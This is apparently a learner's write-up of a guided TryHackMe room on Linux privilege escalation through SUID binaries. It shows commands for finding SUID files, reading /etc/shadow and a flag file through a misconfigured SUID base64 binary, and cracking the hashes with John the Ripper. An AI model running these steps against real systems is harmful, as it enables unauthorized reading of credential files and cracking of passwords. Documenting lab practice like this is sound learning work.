# TryHackMe — Linux Privilege Escalation (SUID Task)

**Platform:** TryHackMe  
**Room:** Linux Privilege Escalation  
**Task:** Privilege Escalation — SUID  
**Difficulty:** Medium  

> **Note:** This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials (karen / Password1) were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

---

## Connection

Connected to the target via SSH using the provided credentials:

```bash
ssh karen@<TARGET_IP>
# Password: Password1
```

Upgraded to a fully interactive shell using Python3:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Question 1 — Which user shares the name of a great comic book writer?

Read `/etc/passwd` to list all users on the system:

```bash
cat /etc/passwd
```

Looked through the usernames and identified the answer from the list.

---

## Question 2 — What is the password of user2?

### Finding SUID Binaries

As covered in the room, searched for files with the SUID or SGID bit set:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Compared the results against [GTFOBins](https://gtfobins.github.io) using the SUID filter.  
`/usr/bin/base64` stood out — GTFOBins shows it can be used for privileged file reads.

### Reading /etc/shadow

Used the SUID `base64` binary to read the shadow file:

```bash
base64 /etc/shadow | base64 --decode
```

This works because `base64` runs with root's effective UID due to the SUID bit,
allowing it to read files that the current user (karen) normally cannot access.

### Cracking the Hashes

Transferred the contents of `/etc/passwd` and `/etc/shadow` to the local machine,
then used `unshadow` and John the Ripper to crack the hashes:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully cracked user2's password, which was the answer to Question 2.

> Out of curiosity, also cracked the hash of the user found in Question 1
> and logged in to explore their account.

---

## Question 3 — What is the content of flag3.txt?

Located the flag file using `find`:

```bash
find / -name flag3.txt 2>/dev/null
# /home/ubuntu/flag3.txt
```

Read the file using the same SUID `base64` technique:

```bash
base64 /home/ubuntu/flag3.txt | base64 --decode
```

Since karen does not have read permission on this file, the SUID base64 binary
was used again to read it with root-level privileges.

---

## Key Takeaways

- SUID binaries run with the **file owner's** privileges, not the executing user's.
  A root-owned SUID binary is essentially a root-level operation.
- `base64` is not typically expected to have the SUID bit — this is a misconfiguration.
  Always check GTFOBins for any unusual SUID binary.
- The `find / -type f -perm -04000 -ls 2>/dev/null` command is the standard way
  to enumerate SUID binaries on a Linux system.
- Even without shell access escalation, SUID file-read primitives can be enough
  to leak sensitive data (shadow hashes, flags, config files).
